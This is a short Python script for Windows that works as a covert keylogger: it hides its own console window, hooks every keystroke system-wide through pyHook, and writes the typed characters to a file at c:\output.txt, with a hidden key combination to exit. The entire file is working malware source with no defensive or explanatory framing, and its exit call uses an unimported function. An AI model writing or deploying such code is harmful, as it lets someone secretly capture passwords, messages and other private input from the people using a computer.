import win32api
import win32console
import win32gui
import pythoncom
import pyHook

# Hide the console window
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

def OnKeyboardEvent(event):
    if event.Ascii == 5:  # If ASCII code 5 (ENQ), exit
        _exit(1)
        
    if event.Ascii != 0 and event.Ascii != 8:  # Ignore null and backspace keys
        try:
            # Open file in read mode to get existing data
            with open(r'c:\output.txt', 'r+') as f:
                buffer = f.read()

            # Add the new keystroke
            with open(r'c:\output.txt', 'w') as f:
                keylogs = chr(event.Ascii)
                if event.Ascii == 13:  # Enter key
                    keylogs = '\n'
                buffer += keylogs
                f.write(buffer)
        except FileNotFoundError:
            # If file not found, create a new file and log the keystroke
            with open(r'c:\output.txt', 'w') as f:
                keylogs = chr(event.Ascii)
                if event.Ascii == 13:
                    keylogs = '\n'
                f.write(keylogs)
    return True  # Allow other hooks to process

# Create a hook manager object
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent

# Set the hook
hm.HookKeyboard()

# Wait forever
pythoncom.PumpMessages()
